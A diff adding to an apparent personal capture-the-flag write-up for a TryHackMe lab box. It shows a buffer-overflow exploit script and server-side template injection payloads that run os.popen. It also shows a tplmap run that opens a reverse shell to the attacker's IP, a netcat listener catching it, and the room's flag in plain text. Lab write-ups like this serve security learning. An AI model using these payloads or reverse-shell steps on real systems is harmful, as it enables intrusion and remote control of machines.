@@ -374,3 +374,379 @@ Choose an action:
 > get_secret_directory: 3
 > store_your_buffer: 4
 1
+Enter an username:A*1998
+Enter a password:A*1998
+User A*1998 successfully registered. You can login now!
+Choose an action:
+> regiser: 1
+> login: 2
+> get_secret_directory: 3
+> store_your_buffer: 4
+2
+Username:A*1998
+Password:A*1998
+You're now authenticated!
+Choose an action:
+> regiser: 1
+> login: 2
+> get_secret_directory: 3
+> store_your_buffer: 4
+3
+My secret in the port 9090 is: 
+Choose an action:
+> regiser: 1
+> login: 2
+> get_secret_directory: 3
+> store_your_buffer: 4
+4
+Enter your buffer:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Flag saved!
+Choose an action:
+> regiser: 1
+> login: 2
+> get_secret_directory: 3
+> store_your_buffer: 4
+3
+My secret in the port 9090 is: /40b5dffec4e39b7a3e9d261d2fc4a038/
+Choose an action:
+> regiser: 1
+> login: 2
+> get_secret_directory: 3
+> store_your_buffer: 4
+
+http://10.10.163.81:9090/40b5dffec4e39b7a3e9d261d2fc4a038/
+```
+```bash
+- ┌──(kali㉿kali)-[~/noname_ctf]
+└─$ nc 10.10.163.81 2222
+Welcome to the NoNameCTF!
+Choose an action:
+> regiser: 1
+> login: 2
+> get_secret_directory: 3
+> store_your_buffer: 4
+1
+Enter an username:a
+Enter a password:a
+Sorry, password too short
+Choose an action:
+> regiser: 1
+> login: 2
+> get_secret_directory: 3
+> store_your_buffer: 4
+2
+Username:a
+Password:a
+You're now authenticated!
+Choose an action:
+> regiser: 1
+> login: 2
+> get_secret_directory: 3
+> store_your_buffer: 4
+3
+My secret in the port 9090 is: 
+Choose an action:
+> regiser: 1
+> login: 2
+> get_secret_directory: 3
+> store_your_buffer: 4
+4
+Enter your buffer:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Flag saved!
+Choose an action:
+> regiser: 1
+> login: 2
+> get_secret_directory: 3
+> store_your_buffer: 4
+3
+My secret in the port 9090 is: /40b5dffec4e39b7a3e9d261d2fc4a038/
+Choose an action:
+> regiser: 1
+> login: 2
+> get_secret_directory: 3
+> store_your_buffer: 4
+
+or
+```
+```bash
+- ┌──(kali㉿kali)-[~/noname_ctf]
+└─$ cat bof.py    
+import telnetlib
+import argparse
+
+parser = argparse.ArgumentParser(description="BOF Exploit")
+parser.add_argument("host", help="The host IP address")
+parser.add_argument("port", help="The host port")
+args=parser.parse_args()
+
+#Read and write
+def read(end_text):
+	tn.read_until(end_text.encode())
+
+def write(text):
+	tn.write(("{0}\n".format(text)).encode())
+#Connect
+tn = telnetlib.Telnet(args.host, args.port)
+
+#Register/Login
+for i in range(1,3):
+    read("4") #Listen for the end of the welcome message
+    write(str(i)) #Pick an option (1 the first time, 2 the second)
+    read(":") #Wait for the end of the username prompt
+    write("jesus") #Enter Username
+    read(":") #Wait for the end of the password prompt
+    write("soon") #Enter password
+
+#store buffer
+read("4") #Listen for the end of the welcome message
+write("4") #Pick option 4 to store a buffer
+read(":") #Listen for the end of the buffer prompt
+write("A"*1998) #Calculate and store the buffer
+
+#complete overflow
+read("4") #Listen for the end of the welcome message
+write("3") #Pick option 3 to receive our secret directory
+read("\n") #Work around to get rid of the newline preceeding response
+print(tn.read_until("\n".encode()).decode()) #Output the directory
+```
+```bash
+- ┌──(kali㉿kali)-[~/noname_ctf]
+└─$ python3 bof.py 10.10.163.81 2222
+My secret in the port 9090 is: /40b5dffec4e39b7a3e9d261d2fc4a038/
+
+<html>
+ <head><title> Hello  </title></head>
+ <body><section class="inside"><h2>Cyber Security training made easy</h2></br>Hello  <p class='m0'>TryHackMe takes the pain out of learning and teaching Cybersecurity. Our platform makes it a comfortable experience to learn by designing prebuilt courses which include virtual machines (VM) hosted in the cloud ready to be deployed. This avoids the hassle of downloading and configuring VM's. Our platform is perfect for CTFs, Workshops, Assessments or Training.</p></section></section></div><div class="container main pb"><section class="row"><div class="col-md-4 green-hover"><h2><i class="fas fa-spider"></i> Hack Instantly</h2><p>Learn, practice and complete! Get hands on and practise your skills in a real-world environment by completing fun and difficult tasks. You can deploy VMs, which will give an IP address instantly and away you go.</p></div><div class="col-md-4 green-hover"><h2><i class="fas fa-door-closed"></i> Rooms</h2><p>Rooms are virtual areas dedicated to particular cyber security topics. For example, a room called "Hacking the Web" could be dedicated to web application vulnerabilities. </p></div><div class="col-md-4 green-hover"><h2><i class="fab fa-fort-awesome"></i> Tasks</h2><p>Each room has tasks that contain questions and hints, a custom leaderboard and chat area. Whilst you're hacking away, you can discuss hacking techniques or request help from others.</p><!-- ?hackme= --></div></section> 
+</body>
+</html>
+
+<!-- ?hackme= -->
+
+http://10.10.163.81:9090/40b5dffec4e39b7a3e9d261d2fc4a038/?hackme=whoami
+
+Hello whoami 
+
+https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#tornado-python
+
+https://ajinabraham.com/blog/server-side-template-injection-in-tornado
+
+http://10.10.163.81:9090/40b5dffec4e39b7a3e9d261d2fc4a038/?hackme={{7*7}}
+
+Hello 49 
+
+{% import *module* %} - Allows you to import python modules.  
+
+ Example:
+{% import os %}{{ os.popen("whoami").read() }}
+
+http://10.10.163.81:9090/40b5dffec4e39b7a3e9d261d2fc4a038/?hackme={%%20import%20os%20%}{{%20os.popen(%22whoami%22).read()%20}}
+
+Hello zeldris 
+
+https://github.com/epinna/tplmap
+
+https://github.com/epinna/tplmap/issues/64
+
+──(kali㉿kali)-[~/noname_ctf]
+└─$ virtualenv -p python2.7 env
+```
+```bash
+- ┌──(kali㉿kali)-[~/noname_ctf]
+└─$ ls
+bof.py  env
+```
+```bash
+- ┌──(kali㉿kali)-[~/noname_ctf]
+└─$ cd env
+```
+```bash
+- ┌──(kali㉿kali)-[~/noname_ctf/env]
+└─$ ls
+bin  lib  pyvenv.cfg
+```
+```bash
+- ┌──(kali㉿kali)-[~/noname_ctf/env]
+└─$ cd bin
+```
+```bash
+- ┌──(kali㉿kali)-[~/noname_ctf/env/bin]
+└─$ ls
+activate       activate.ps1      easy_install-2.7  pip-2.7  python2.7  wheel2.7
+activate.csh   activate_this.py  easy_install2.7   pip2.7   wheel
+activate.fish  easy_install      pip               python   wheel2
+activate.nu    easy_install2     pip2              python2  wheel-2.7
+```
+```bash
+- ┌──(kali㉿kali)-[~/noname_ctf/env/bin]
+└─$ cd ../..
+```
+```bash
+- ┌──(kali㉿kali)-[~/noname_ctf]
+└─$ ls
+bof.py  env
+```
+```bash
+- ┌──(kali㉿kali)-[~/noname_ctf]
+└─$ source env/bin/activate
+                                                                                              
+┌──(env)─(kali㉿kali)-[~/noname_ctf]
+└─$ git clone https://github.com/epinna/tplmap.git                                           
+Cloning into 'tplmap'...
+remote: Enumerating objects: 4127, done.
+remote: Counting objects: 100% (50/50), done.
+remote: Compressing objects: 100% (40/40), done.
+remote: Total 4127 (delta 15), reused 33 (delta 10), pack-reused 4077
+Receiving objects: 100% (4127/4127), 677.75 KiB | 1.39 MiB/s, done.
+Resolving deltas: 100% (2694/2694), done.
+                                                                                              
+┌──(env)─(kali㉿kali)-[~/noname_ctf]
+└─$ cd tplmap 
+                                                                                              
+┌──(env)─(kali㉿kali)-[~/noname_ctf/tplmap]
+└─$ ls
+burp_extension     config.yml  docker-envs  plugins    requirements.txt  tplmap.py
+burp_extension.py  core        LICENSE.md   README.md  tests             utils
+                                                                                              
+┌──(env)─(kali㉿kali)-[~/noname_ctf/tplmap]
+└─$ python2 -m pip install -r requirements.txt
+DEPRECATION: Python 2.7 reached the end of its life on January 1st, 2020. Please upgrade your Python as Python 2.7 is no longer maintained. pip 21.0 will drop support for Python 2.7 in January 2021. More details about Python 2 support in pip can be found at https://pip.pypa.io/en/latest/development/release-process/#python-2-support pip 21.0 will remove support for this functionality.
+Collecting PyYAML==5.1.2
+  Using cached PyYAML-5.1.2.tar.gz (265 kB)
+Collecting certifi==2018.10.15
+  Using cached certifi-2018.10.15-py2.py3-none-any.whl (146 kB)
+Collecting chardet==3.0.4
+  Using cached chardet-3.0.4-py2.py3-none-any.whl (133 kB)
+Collecting idna==2.8
+  Using cached idna-2.8-py2.py3-none-any.whl (58 kB)
+Collecting requests==2.22.0
+  Using cached requests-2.22.0-py2.py3-none-any.whl (57 kB)
+Collecting urllib3==1.24.1
+  Using cached urllib3-1.24.1-py2.py3-none-any.whl (118 kB)
+Requirement already satisfied: wsgiref==0.1.2 in /usr/lib/python2.7 (from -r requirements.txt (line 7)) (0.1.2)
+Building wheels for collected packages: PyYAML
+  Building wheel for PyYAML (setup.py) ... done
+  Created wheel for PyYAML: filename=PyYAML-5.1.2-cp27-cp27mu-linux_x86_64.whl size=44911 sha256=37bbeddd242824f328c5b9a19fe71d86bde8aad52e8c3c5d33409585c537c07d
+  Stored in directory: /home/kali/.cache/pip/wheels/87/9b/a7/9bfdaa1487acce958269a6b5f86db2e4d38204dff4e256e23a
+Successfully built PyYAML
+Installing collected packages: PyYAML, certifi, chardet, idna, urllib3, requests
+Successfully installed PyYAML-5.1.2 certifi-2018.10.15 chardet-3.0.4 idna-2.8 requests-2.22.0 urllib3-1.24.1
+
+┌──(env)─(kali㉿kali)-[~/noname_ctf/tplmap]
+└─$ ./tplmap.py -u http://10.10.163.81:9090/40b5dffec4e39b7a3e9d261d2fc4a038/?hackme= --reverse-shell 10.8.19.103 1337
+[+] Tplmap 0.5
+    Automatic Server-Side Template Injection Detection and Exploitation Tool
+
+[+] Testing if GET parameter 'hackme' is injectable
+[+] Smarty plugin is testing rendering with tag '*'
+[+] Smarty plugin is testing blind injection
+[+] Mako plugin is testing rendering with tag '${*}'
+[+] Mako plugin is testing blind injection
+[+] Python plugin is testing rendering with tag 'str(*)'
+[+] Python plugin is testing blind injection
+[+] Tornado plugin is testing rendering with tag '{{*}}'
+[+] Tornado plugin has detected unreliable rendering with tag '{{*}}', skipping
+[+] Tornado plugin is testing blind injection
+[+] Tornado plugin has confirmed blind injection
+[+] Tplmap identified the following injection point:
+
+  GET parameter: hackme
+  Engine: Tornado
+  Injection: *
+  Context: text
+  OS: undetected
+  Technique: blind
+  Capabilities:
+
+   Shell command execution: ok (blind)
+   Bind and reverse shell: ok
+   File write: ok (blind)
+   File read: no
+   Code evaluation: ok, python code (blind)
+
+[-][tcpserver] Port bind on 0.0.0.0:1337 has failed: [Errno 98] Address already in use
+```
+```bash
+- ┌──(kali㉿kali)-[~/Downloads]
+└─$ rlwrap nc -lvnp 1337
+Ncat: Version 7.93 ( https://nmap.org/ncat )
+Ncat: Listening on :::1337
+Ncat: Listening on 0.0.0.0:1337
+Ncat: Connection from 10.10.163.81.
+Ncat: Connection from 10.10.163.81:37710.
+/bin/sh: 0: can't access tty; job control turned off
+```
+```bash
+- $ whoami
+zeldris
+```
+```bash
+- $ ls
+server.py
+```
+```bash
+- $ cat server.py
+import tornado.template
+import tornado.ioloop
+import tornado.web
+TEMPLATE = '''
+<html>
+ <head><title> Hello {{ name }} </title></head>
+ <body><section class="inside"><h2>Cyber Security training made easy</h2></br>Hello FOO <p class='m0'>TryHackMe takes the pain out of learning and teaching Cybersecurity. Our platform makes it a comfortable experience to learn by designing prebuilt courses which include virtual machines (VM) hosted in the cloud ready to be deployed. This avoids the hassle of downloading and configuring VM's. Our platform is perfect for CTFs, Workshops, Assessments or Training.</p></section></section></div><div class="container main pb"><section class="row"><div class="col-md-4 green-hover"><h2><i class="fas fa-spider"></i> Hack Instantly</h2><p>Learn, practice and complete! Get hands on and practise your skills in a real-world environment by completing fun and difficult tasks. You can deploy VMs, which will give an IP address instantly and away you go.</p></div><div class="col-md-4 green-hover"><h2><i class="fas fa-door-closed"></i> Rooms</h2><p>Rooms are virtual areas dedicated to particular cyber security topics. For example, a room called "Hacking the Web" could be dedicated to web application vulnerabilities. </p></div><div class="col-md-4 green-hover"><h2><i class="fab fa-fort-awesome"></i> Tasks</h2><p>Each room has tasks that contain questions and hints, a custom leaderboard and chat area. Whilst you're hacking away, you can discuss hacking techniques or request help from others.</p><!-- ?hackme= --></div></section> 
+</body>
+</html>
+'''
+class MainHandler(tornado.web.RequestHandler):
+
+    def get(self):
+        name = self.get_argument('hackme', '')
+        template_data = TEMPLATE.replace("FOO",name)
+        t = tornado.template.Template(template_data)
+        self.write(t.generate(name=name))
+
+application = tornado.web.Application([
+    (r"/40b5dffec4e39b7a3e9d261d2fc4a038/", MainHandler),
+], debug=True, static_path=None, template_path=None)
+
+if __name__ == '__main__':
+    application.listen(9090)
+    tornado.ioloop.IOLoop.instance().start()
+```
+```bash
+- $ pwd
+/home/zeldris/nonamectf/ssti
+```
+```bash
+- $ cd ..
+```
+```bash
+- $ ls
+run.sh
+ssti
+tryhackme
+```
+```bash
+- $ cat run.sh
+#!/bin/bash
+socat TCP-LISTEN:2222,reuseaddr,fork EXEC:./tryhackme,pty,stderr,echo=0
+```
+```bash
+- $ cd ..
+```
+```bash
+- $ ls
+nonamectf
+user.txt
+```
+```bash
+- $ cat user.txt
+THM{SSTI_AND_BUFFER_OVERFLOW_W4S_HERE}
+
+priv esc
+
+https://gtfobins.github.io/gtfobins/pip/
+```
+- ***THM{SSTI_AND_BUFFER_OVERFLOW_W4S_HERE}***
+
+## Notes / Lessons Learned
+[[Binex]]
+
